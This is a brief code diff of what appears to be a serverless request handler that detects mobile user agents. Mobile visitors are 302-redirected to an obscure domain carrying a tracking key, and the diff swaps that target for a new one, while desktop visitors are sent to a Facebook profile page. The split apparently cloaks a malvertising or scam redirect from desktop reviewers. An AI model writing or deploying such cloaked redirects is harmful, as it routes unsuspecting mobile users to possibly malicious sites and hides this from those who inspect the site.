@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://morningwebs.com/zj6g", 302);
+    return Response.redirect("https://advantagesblareseizure.com/f5h785ff?key=3a750ed3c827d8bdfcb92abd736a8ffc", 302);
   } else {
     return Response.redirect("https://web.facebook.com/zuck/?_rdc=1&_rdr#", 302);
   }
